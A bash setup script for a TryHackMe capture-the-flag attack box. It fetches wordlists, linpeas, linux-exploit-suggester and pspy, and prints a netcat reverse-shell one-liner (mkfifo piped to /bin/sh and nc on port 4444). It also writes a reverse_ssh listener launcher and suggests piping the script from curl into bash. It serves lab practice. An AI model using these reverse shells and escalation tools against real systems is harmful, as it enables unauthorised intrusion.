#! /bin/bash

echo "-- THM attack box setup --" 
# intended to be copy pasted into the shell, or run in one command via:
#   curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash

echo "linking wordlists locally (rockyou.txt and fuzzwordlist.txt)"
ln -s /usr/share/wordlists/rockyou.txt rockyou.txt
cat /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt | sort -u > fuzzwordlist.txt

echo "linpeas & les local copies"
wget -q https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

echo "rustscan.sh"
echo "docker run -it --rm --name rustscan rustscan/rustscan:latest -a \$1 -- -A" > rustscan.sh
chmod +x rustscan.sh

echo "nc-rev: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f"

ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
echo "ssh public key is:"
cat .ssh/id_ed25519.pub

echo "reverse_s.sh"
echo "docker run -p3232:2222 -e EXTERNAL_ADDRESS=$(hostname -I | tr ' ' '\n' | grep '^10\.10\.'):3232 -e SEED_AUTHORIZED_KEYS='$(cat ~/.ssh/id_ed25519.pub)' -v data:/data reversessh/reverse_ssh" > reverse_s.sh
chmod +x reverse_s.sh

echo "grabbing pspy64"
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

echo "ready!"
